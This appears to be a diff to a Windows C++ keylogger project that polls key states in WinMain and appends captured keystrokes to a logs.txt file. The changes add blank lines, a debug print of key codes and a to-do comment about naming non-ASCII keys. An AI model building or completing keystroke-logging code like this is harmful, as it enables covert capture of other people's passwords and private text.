@@ -13,7 +13,9 @@ void writeKeyStroke(int trueKey)
 {
     std::ofstream file;
     file.open("logs.txt", std::ios::app);
+        
     if (trueKey == BACKSPACE)
+        
     {
         file << "BACKSPACE";
     }
@@ -41,6 +43,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
             int key = GetAsyncKeyState(i);
             while (key == KEY_IS_PRESSED && i != 16)
             {
+                std::cout << i << '\n';
                 int specialKey = vkMaps.searchAsciiMaps(i);
                 if (isShiftPressed() == 1) 
                 {
@@ -70,7 +73,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
 
             To-do
-        ~ make constants for 0-9. 
-        ~ check if declaring and defining them as const int name is a safe way to declare const variables in a header file. 
+        ~ develop naming convention for characters that don't translate to ascii values. 
+        {kp=BACKSPACE}
 
 */ 
